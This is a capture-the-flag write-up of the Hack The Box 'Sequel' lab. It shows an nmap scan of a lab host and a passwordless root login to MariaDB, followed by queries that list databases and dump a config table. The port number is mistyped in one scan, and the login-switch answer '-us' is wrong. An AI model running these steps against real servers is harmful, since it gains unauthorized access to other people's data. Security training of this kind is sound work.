---
title: 'Sequel - HTB Starting Point Tier 1'
description: 'Writeup for Sequel box'
pubDate: 'Nov 26 2024'
heroImage: '/blog-placeholder-2.jpg'
---

## Sequel
*MySQL, SQL, Weak credentials*

**Task 1**  
During our scan, which port do we find serving MySQL?  
```bash
kali$ nmap -sV $TARGET

PORT     STATE SERVICE VERSION
3306/tcp open  mysql?

kali$ nmap -A $TARGET -p3006

PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
| mysql-info:
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 96
|   Capabilities flags: 63486
|   Some Capabilities: Speaks41ProtocolNew, SupportsLoadDataLocal, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, ODBCClient, Support41Auth, Speaks41ProtocolOld, LongColumnFlag, IgnoreSigpipes, SupportsTransactions, DontAllowDatabaseTableColumn, InteractiveClient, SupportsCompression, FoundRows, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: Rz2(p{<V{-f>Ainn^j{M
|_  Auth Plugin Name: mysql_native_password
```


**Task 2**  
What community-developed MySQL version is the target running?  
MariaDB


**Task 3**  
When using the MySQL command line client, what switch do we need to use in order to specify a login username?  
`mysql -us <name>`


**Task 4**  
Which username allows us to log into this MariaDB instance without providing a password?  
`root`


**Task 5**  
In SQL, what symbol can we use to specify within the query that we want to display everything inside a table?  
`*`


**Task 6**
In SQL, what symbol do we need to end each query with?  
`;`


**Task 7**
There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that's unique to this host?
```bash
kali$ mysql -u root -h $TARGET --skip-ssl

MariaDB> SHOW DATABASES
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.388 sec)
```

Answer: `htb`

This means that `information_schema`, `mysql` and `performance_schema` are found on every instance of MySQL

**Task 8**  
Submit root flag  

```sql
MariaDB> use htb

MariaDB [htb]> SHOW TABLES;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.305 sec)

MariaDB [htb]> SELECT * FROM config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | <flag>                           |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.336 sec)
```
